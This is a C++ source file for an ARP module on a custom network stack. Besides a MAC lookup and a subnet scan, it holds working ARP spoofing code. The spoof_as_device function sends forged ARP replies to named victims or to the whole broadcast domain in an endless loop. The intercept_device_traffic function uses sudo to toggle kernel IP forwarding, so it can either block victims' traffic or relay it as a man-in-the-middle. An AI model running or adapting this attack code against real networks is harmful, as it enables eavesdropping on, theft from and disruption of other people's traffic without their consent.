#include "net_arp.h"

#include <iostream>
#include <cstring>
#include <netinet/if_ether.h>
#include <thread>
#include <netinet/in.h>
using namespace std;

net_arp::net_arp(gateway *gw) : data_link_layer_gateway(gw) {
    // send flow
    ether_client.send_medium.add_send_channel(data_link_layer_gateway);

    // recv flow
    data_link_layer_gateway->add_listener(&ether_client);

    ether_client.listeners.append_new_empty_handler(&arp_recv_q);
    ether_client.listeners.add_requirement_to_last_handler<ETHER_LISTEN_ON_PROTOCOL_INDEX>(ethernet_header::ethertype_values::arp);
}

net_arp::~net_arp() {
    data_link_layer_gateway->remove_listener(&ether_client);
}

mac_addr net_arp::search_for_mac_addr(ip4_addr searched_ip, mac_addr src_mac, ip4_addr src_ip) {
#define BUFF_SZ 65536
    uint8_t buff[BUFF_SZ] = {0};

    // setup net_arp
    struct ether_arp *arp_header = (struct ether_arp *) buff; // arp_header header
    arp_header->arp_hrd = htons(ARPHRD_ETHER); // first net_arp octets type: mac
    arp_header->arp_pro = htons(ethernet_header::ethertype_values::ip4); // first net_arp octets type: ip
    arp_header->arp_hln = ETH_ALEN; // len of mac octets
    arp_header->arp_pln = 4; // len of ip octets
    arp_header->arp_op = htons(ARPOP_REQUEST); // type of net_arp (request)

    write_in_network_order(arp_header->arp_sha, &src_mac);
    write_in_network_order(arp_header->arp_spa, &src_ip);
//    memset(arp_header->arp_spa, 0, sizeof(arp_header->arp_spa));

    memset(arp_header->arp_tha, 0, sizeof(arp_header->arp_tha));
    write_in_network_order(arp_header->arp_tpa, &searched_ip);


    ether_client.next_protocol.set_next_choice(ethernet_header::ethertype_values::arp);
    ether_client.next_source_addr.set_next_choice(src_mac);
    ether_client.next_dest_addr.set_next_choice(BROADCAST_MAC);

    while (true) {
        // send frame
        int cnt = sizeof(ether_arp);
        send_msg_t request;
        memcpy(request.get_active_buff(), buff, cnt);
        request.set_count(cnt);
        ether_client.send_data(std::move(request));

        // recv frame
        recv_msg_t* reply = arp_recv_q.queue.front<50>();
        if (reply == nullptr) continue; // didn't receive a response in a reasonable time, continue and send again
        arp_recv_q.queue.clear();

        uint8_t *reply_buff = reply->buff.data() + reply->curr_offset;

        struct ether_arp *arp_reply = (struct ether_arp *) reply_buff;
        if (ntohs(arp_reply->ea_hdr.ar_op) != ARPOP_REPLY) {
            cerr << "received arp not of type reply" << endl;
            continue;
        }

        mac_addr res{};
        extract_from_network_order(&res, arp_reply->arp_sha);
        return res;
    }
}

vector<pair<ip4_addr, mac_addr>> net_arp::scan_entire_subnet(ip4_subnet_mask mask, mac_addr src_mac, ip4_addr src_ip) {
#define BUFF_SZ 65536
    uint8_t buff[BUFF_SZ] = {0};

    ip4_addr curr_ip = smallest_ip_addr_in_subnet(mask);
    while (true) {
        std::cout << "sending search for ip: " << convert_to_str(curr_ip) << endl;
        if (!is_inside_subnet(mask, curr_ip)) {
            break;
        }

        // setup net_arp
        struct ether_arp *arp_header = (struct ether_arp *) buff; // arp_header header
        arp_header->arp_hrd = htons(ARPHRD_ETHER); // first net_arp octets type: mac
        arp_header->arp_pro = htons(ethernet_header::ethertype_values::ip4); // first net_arp octets type: ip
        arp_header->arp_hln = ETH_ALEN; // len of mac octets
        arp_header->arp_pln = 4; // len of ip octets
        arp_header->arp_op = htons(ARPOP_REQUEST); // type of net_arp (request)

        write_in_network_order(arp_header->arp_sha, &src_mac);
        write_in_network_order(arp_header->arp_spa, &src_ip);
//        memset(arp_header->arp_spa, 0, sizeof(arp_header->arp_spa));

        memset(arp_header->arp_tha, 0, sizeof(arp_header->arp_tha));
        write_in_network_order(arp_header->arp_tpa, &curr_ip);


        // req
        ether_client.next_protocol.set_next_choice(ethernet_header::ethertype_values::arp);
        ether_client.next_source_addr.set_next_choice(src_mac);
        ether_client.next_dest_addr.set_next_choice(BROADCAST_MAC);

        int cnt = sizeof(ether_arp);
        send_msg_t request;
        memcpy(request.get_active_buff(), buff, cnt);
        request.set_count(cnt);
        ether_client.send_data(std::move(request));

        curr_ip = generate_next_ip(curr_ip);

        std::this_thread::sleep_for(5ms);
    }

    std::cout << "search sends completed, waiting for replies" << endl;

    // wait some reasonable time for all the replies
    std::this_thread::sleep_for(3000ms);

    vector<pair<ip4_addr, mac_addr>> res;
    while (!arp_recv_q.queue.is_empty()) {
        recv_msg_t* reply = arp_recv_q.queue.front<0>();
        arp_recv_q.queue.pop_front();
        uint8_t *reply_buff = reply->buff.data() + reply->curr_offset;

        struct ether_arp *arp_reply = (struct ether_arp *) reply_buff;
        if (ntohs(arp_reply->ea_hdr.ar_op) != ARPOP_REPLY)
            continue;

        mac_addr res_mac{};
        extract_from_network_order(&res_mac, arp_reply->arp_sha);

        ip4_addr res_ip;
        extract_from_network_order(&res_ip, arp_reply->arp_spa);

        res.emplace_back(res_ip, res_mac);
    }

    std::cout << "search completed, got " << res.size() << " replies" << endl;

    return res;
}


void net_arp::spoof_as_device(const std::vector<ip4_addr> &victims_ip, ip4_addr target_ip,
                              mac_addr src_mac, ip4_addr src_ip) {
    int no_victims = victims_ip.size();

    vector<mac_addr> victim_macs(no_victims);
    for (int i = 0; i < no_victims; i++)
        victim_macs[i] = search_for_mac_addr(victims_ip[i], src_mac, src_ip);

#define BUFF_SZ 65536
    uint8_t buff[BUFF_SZ] = {0};

    // prepare net_arp
    struct ether_arp *arp_header = (struct ether_arp *) buff; // arp_header header
    arp_header->arp_hrd = htons(ARPHRD_ETHER); // first net_arp octets type: mac
    arp_header->arp_pro = htons(ethernet_header::ethertype_values::ip4); // first net_arp octets type: ip
    arp_header->arp_hln = ETH_ALEN; // len of mac octets
    arp_header->arp_pln = 4; // len of ip octets
    arp_header->arp_op = htons(ARPOP_REPLY); // type of net_arp (forged reply)

    write_in_network_order(arp_header->arp_sha, &src_mac); // my spoofed mac octets
    write_in_network_order(arp_header->arp_spa, &target_ip);


    while (true) {
        std::this_thread::sleep_for(300ms);

        if (victims_ip.empty()) { // spoof whole broadcast
            memset(arp_header->arp_tha, 0xff, ETH_ALEN);
            memset(arp_header->arp_tpa, 0x00, 4);

            ether_client.next_dest_addr.set_next_choice(BROADCAST_MAC);
            ether_client.next_protocol.set_next_choice(ethernet_header::ethertype_values::arp);

            int cnt = sizeof(ether_arp);
            send_msg_t request;
            memcpy(request.get_active_buff(), buff, cnt);
            request.set_count(cnt);
            ether_client.send_data(std::move(request));

        } else { // spoof every victim
            for (int i = 0; i < no_victims; i++) {
                ip4_addr victim_ip = victims_ip[i];
                mac_addr victim_mac = victim_macs[i];

                // send to specific target_ip
                write_in_network_order(arp_header->arp_tha, &victim_mac);
                write_in_network_order(arp_header->arp_tpa, &victim_ip);

                ether_client.next_dest_addr.set_next_choice(victim_mac);
                ether_client.next_protocol.set_next_choice(ethernet_header::ethertype_values::arp);

                int cnt = sizeof(ether_arp);
                send_msg_t request;
                memcpy(request.get_active_buff(), buff, cnt);
                request.set_count(cnt);
                ether_client.send_data(std::move(request));
            }

        }

        std::cout << "spoofed frames sent" << endl;
    }

}

void net_arp::intercept_device_traffic(const vector<ip4_addr> &victim_devices, ip4_addr dest, bool block, mac_addr src_mac, ip4_addr src_ip) {
    // block/allow traffic (linux)
    if (block) system("echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null");
    else system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null");

    spoof_as_device(victim_devices, dest, src_mac, src_ip);
//    if (bidirectional)
//        for (ip4_addr victim: victim_devices)
//            spoof_as_device({dest}, victim, my_mac);

}


void net_arp::announce_new_mac(ip4_addr src_ip, mac_addr new_mac) {
#define BUFF_SZ 65536
    uint8_t buff[BUFF_SZ] = {0};

    // setup net_arp
    struct ether_arp *arp_header = (struct ether_arp *) buff; // arp_header header
    arp_header->arp_hrd = htons(ARPHRD_ETHER); // first net_arp octets type: mac
    arp_header->arp_pro = htons(ethernet_header::ethertype_values::ip4); // first net_arp octets type: ip
    arp_header->arp_hln = ETH_ALEN; // len of mac octets
    arp_header->arp_pln = 4; // len of ip octets
    arp_header->arp_op = htons(ARPOP_REQUEST); // type of net_arp (request)

    write_in_network_order(arp_header->arp_sha, &new_mac);
    write_in_network_order(arp_header->arp_spa, &src_ip);

    memset(arp_header->arp_tha, 0, sizeof(arp_header->arp_tha));
    write_in_network_order(arp_header->arp_tpa, &src_ip);


    ether_client.next_protocol.set_next_choice(ethernet_header::ethertype_values::arp);
    ether_client.next_source_addr.set_next_choice(new_mac);
    ether_client.next_dest_addr.set_next_choice(BROADCAST_MAC);

    // send frame
    int cnt = sizeof(ether_arp);
    send_msg_t request;
    memcpy(request.get_active_buff(), buff, cnt);
    request.set_count(cnt);
    ether_client.send_data(std::move(request));

}
